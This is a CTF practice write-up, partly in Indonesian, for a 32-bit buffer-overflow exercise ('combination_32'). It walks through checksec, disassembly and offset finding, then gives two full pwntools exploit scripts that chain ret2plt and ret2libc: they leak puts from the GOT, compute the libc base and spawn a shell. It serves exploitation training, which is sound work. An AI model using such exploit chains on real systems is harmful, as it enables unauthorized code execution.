---
slug: "pwn-combination-32"
title: "combination_32"
competition: "Exercise"
category: "Pwn"
difficulty: "Medium"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2plt and ret2libc."
tags: ["PWN","ROP","HANDS-ON","MEDIUM","X86","RET2PLT","RET2LIBC"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-combination-32"
---

# combination_32

> Latihan buat persiapan seleksi LKS, isinya ret2plt and ret2libc.

Langsung saja kita checksec.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine main*
❯ checksec combination_32                                                        󰥔 16:17:00
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine/combination_32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Let’s check the function.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine main*
❯ pwndbg combination_32                                                          󰥔 16:31:13
info fGEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from combination_32...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.cachyos.org>
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in combination_32)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049090  printf@plt
0x080490a0  gets@plt
0x080490b0  puts@plt
0x080490c0  __libc_start_main@plt
0x080490d0  setvbuf@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  init
0x08049240  luna_learn
0x080492dd  main
0x08049330  __libc_csu_init
0x080493a0  __libc_csu_fini
0x080493a5  __x86.get_pc_thunk.bp
0x080493ac  _fini
```

There’s so many symbols and function in this one, lets check the function.

```
gef➤  disas main
Dump of assembler code for function main:
   0x080492dd <+0>:     endbr32
   0x080492e1 <+4>:     lea    ecx,[esp+0x4]
   0x080492e5 <+8>:     and    esp,0xfffffff0
   0x080492e8 <+11>:    push   DWORD PTR [ecx-0x4]
   0x080492eb <+14>:    push   ebp
   0x080492ec <+15>:    mov    ebp,esp
   0x080492ee <+17>:    push   ebx
   0x080492ef <+18>:    push   ecx
   0x080492f0 <+19>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x080492f5 <+24>:    add    ebx,0x2d0b
   0x080492fb <+30>:    call   0x80491f6 <init>
   0x08049300 <+35>:    sub    esp,0xc
   0x08049303 <+38>:    lea    eax,[ebx-0x1ea2]
   0x08049309 <+44>:    push   eax
   0x0804930a <+45>:    call   0x80490b0 <puts@plt>
   0x0804930f <+50>:    add    esp,0x10
   0x08049312 <+53>:    call   0x8049240 <luna_learn>
   0x08049317 <+58>:    mov    eax,0x0
   0x0804931c <+63>:    lea    esp,[ebp-0x8]
   0x0804931f <+66>:    pop    ecx
   0x08049320 <+67>:    pop    ebx
   0x08049321 <+68>:    pop    ebp
   0x08049322 <+69>:    lea    esp,[ecx-0x4]
   0x08049325 <+72>:    ret
End of assembler dump.
gef➤  disas luna_learn
Dump of assembler code for function luna_learn:
   0x08049240 <+0>:     endbr32
   0x08049244 <+4>:     push   ebp
   0x08049245 <+5>:     mov    ebp,esp
   0x08049247 <+7>:     push   ebx
   0x08049248 <+8>:     sub    esp,0x104
   0x0804924e <+14>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049253 <+19>:    add    ebx,0x2dad
   0x08049259 <+25>:    sub    esp,0xc
   0x0804925c <+28>:    lea    eax,[ebx-0x1ff8]
   0x08049262 <+34>:    push   eax
   0x08049263 <+35>:    call   0x80490b0 <puts@plt>
   0x08049268 <+40>:    add    esp,0x10
   0x0804926b <+43>:    sub    esp,0xc
   0x0804926e <+46>:    lea    eax,[ebx-0x1fe0]
   0x08049274 <+52>:    push   eax
   0x08049275 <+53>:    call   0x80490b0 <puts@plt>
   0x0804927a <+58>:    add    esp,0x10
   0x0804927d <+61>:    sub    esp,0xc
   0x08049280 <+64>:    lea    eax,[ebx-0x1f84]
   0x08049286 <+70>:    push   eax
   0x08049287 <+71>:    call   0x80490b0 <puts@plt>
   0x0804928c <+76>:    add    esp,0x10
   0x0804928f <+79>:    sub    esp,0xc
   0x08049292 <+82>:    lea    eax,[ebx-0x1f20]
   0x08049298 <+88>:    push   eax
   0x08049299 <+89>:    call   0x80490b0 <puts@plt>
   0x0804929e <+94>:    add    esp,0x10
   0x080492a1 <+97>:    sub    esp,0xc
   0x080492a4 <+100>:   lea    eax,[ebx-0x1efc]
   0x080492aa <+106>:   push   eax
   0x080492ab <+107>:   call   0x8049090 <printf@plt>
   0x080492b0 <+112>:   add    esp,0x10
   0x080492b3 <+115>:   sub    esp,0xc
   0x080492b6 <+118>:   lea    eax,[ebp-0x108]
   0x080492bc <+124>:   push   eax
   0x080492bd <+125>:   call   0x80490a0 <gets@plt>
   0x080492c2 <+130>:   add    esp,0x10
   0x080492c5 <+133>:   sub    esp,0xc
   0x080492c8 <+136>:   lea    eax,[ebx-0x1ed4]
   0x080492ce <+142>:   push   eax
   0x080492cf <+143>:   call   0x80490b0 <puts@plt>
   0x080492d4 <+148>:   add    esp,0x10
   0x080492d7 <+151>:   nop
   0x080492d8 <+152>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x080492db <+155>:   leave
   0x080492dc <+156>:   ret
End of assembler dump.
```

Okay then, now we count the padding for the gets. 0x108 = 264, because its x86, we need 268 for reaching EIP. And now we verification for the offset for the EIP.

```
>>> 0x108
264
>>> 0x108 + 4
268
```

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x32
$ebx   : 0x63616170 ("paac"?)
$ecx   : 0xf7f7b888  →  0x00000000
$edx   : 0xf7f7b888  →  0x00000000
$esp   : 0xffffd1b0  →  "saactaacuaacvaacwaacxaacyaac"
$ebp   : 0x63616171 ("qaac"?)
$esi   : 0xf7f79e2c  →  0x00292d4c ("L-)"?)
$edi   : 0x08049330  →  <__libc_csu_init+0000> endbr32
$eip   : 0x63616172 ("raac"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd1b0│+0x0000: "saactaacuaacvaacwaacxaacyaac"       ← $esp
0xffffd1b4│+0x0004: "taacuaacvaacwaacxaacyaac"
0xffffd1b8│+0x0008: "uaacvaacwaacxaacyaac"
0xffffd1bc│+0x000c: "vaacwaacxaacyaac"
0xffffd1c0│+0x0010: "waacxaacyaac"
0xffffd1c4│+0x0014: "xaacyaac"
0xffffd1c8│+0x0018: "yaac"
0xffffd1cc│+0x001c: 0xf7d09a00  →   add eax, DWORD PTR [ecx]
────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x63616172
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "combination_32", stopped 0x63616172 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  cyclic -l raac
Finding cyclic pattern of 4 bytes: b'raac' (hex: 0x72616163)
Found at offset 268
```

```bash
~/c/p/l/B/H/R/r/combine main* 1m 56s
❯ ./combination_32                                                               󰥔 16:33:20
Mari belajar dengan luna
Luna: Halooo! Aku Luna
Luna: Hari ini kita belajar combinasinya. Namun... Luna tidak tau caranya. Apakah kamu tau?
Luna: Kata kakak Yui sih... gabungin ret2plt dan ret2lib. Tapi... Luna tidak tau caranya, hem...
Luna: Bisakah kamu membantu luna?
Luna: Harusnya sih... Kayak gini yah
>
```

Nah, karena disitu kita sudah diberi hint bahwa ini itu gabungan antara ret2plt and ret2lib. Basically, ret2plt itu mengubah .plt menjadi .got biar bisa dileak

ret2plt itu nimpa adddress plt dengan address got yang dimau.  
kita nanti nimpanya pakai got.plt.  
ngubah value dari got pltnya  
yang dibaca got, jadi nanti puts yang plt itu bakal ngebaca address si puts got.apa

Template biasanya itu seperti ini:

```
p.recvline()

payload = flat(
    'A' * 32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    libc.sym['exit'],
    next(libc.search(b'/bin/sh\x00'))
)
```

But in this challenge, tidak jauh berbeda. Kita hanya mengubah waktu di mana masuk ke puts\_leak. Tinggal memasukkan recvuntil disaat hampir selesai biar kita bisa mendapatkan leak yang puts lalu dimasukkan ke variable.

![](/assets/uploads/383f96db-caee-4046-b4ea-be6afe028343-screenshot_2026-08-18_12-52-35.png)My own solver: (actually I’m using template from pwninit and then i modifed it a bit for my own environment)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("combination_32_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]
context.arch= "i386"
libc = elf.libc

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    r.recvline()

    payload = flat(
        'A' * 268,
        elf.plt['puts'],   # 1. Alamat fungsi yang dipanggil
        elf.sym['main'],   # 2. Return Address setelah puts selesai
        elf.got['puts']    # 3. Argumen pertama yang diberikan ke puts
    )

    r.sendline(payload)
    r.recvuntil("Luna: Harusnya sudah sih... Ehm... semoga yahh \n")
    puts_leak = u32(r.recv(4))

    libc.address = puts_leak - libc.sym['puts']
    log.success(f'LIBC base: {hex(libc.address)}')

    payload = flat(
        b'A' * 268,
        libc.sym['system'],
        libc.sym['exit'],
        next(libc.search(b'/bin/sh\x00'))
    )
    # good luck pwning :)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

**Implement:**

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine main*
❯ python3 solve.py LOCAL                                                         󰥔 16:49:55
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine/combination_32_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/usr/lib32/libc.so.6'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[x] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[▖] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[+] on/ROP/ret2combine/combine/combination_32_patched': pid 170536
/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine/solve.py:36: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  payload = flat(
/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2combine/combine/solve.py:44: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.recvuntil("Luna: Harusnya sudah sih... Ehm... semoga yahh \n")
[+] LIBC base: 0xf7c4f000
[*] Switching to interactive mode
\x90\x1b\xc7\xf7@\x93\xce\xf7
Mari belajar dengan luna
Luna: Halooo! Aku Luna
Luna: Hari ini kita belajar combinasinya. Namun... Luna tidak tau caranya. Apakah kamu tau?
Luna: Kata kakak Yui sih... gabungin ret2plt dan ret2lib. Tapi... Luna tidak tau caranya, hem...
Luna: Bisakah kamu membantu luna?
Luna: Harusnya sih... Kayak gini yah
>
 Luna: Harusnya sudah sih... Ehm... semoga yahh
$ ls
combination_32          combination_64  combine.zip
combination_32_patched  combination.c   solve.py
```

Solver resmi dari latihan LKS nya adalah:

```python
from pwn import *

elf = context.binary = ELF('./combination_32')
libc = elf.libc
p = process()

offset = 268

payload = flat (
    'A' * offset,
    elf.plt['printf'],
    elf.sym['main'],
    elf.got['puts']
)

p.sendlineafter(b'>', payload)

p.recvuntil("Luna: Harusnya sudah sih... Ehm... semoga yahh \n")

puts_leak = u32(p.recv(4))

libc.address = puts_leak - libc.sym['puts']

payload = flat(
    'A' * 268,
    libc.sym['system'],
    libc.sym['exit'],
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
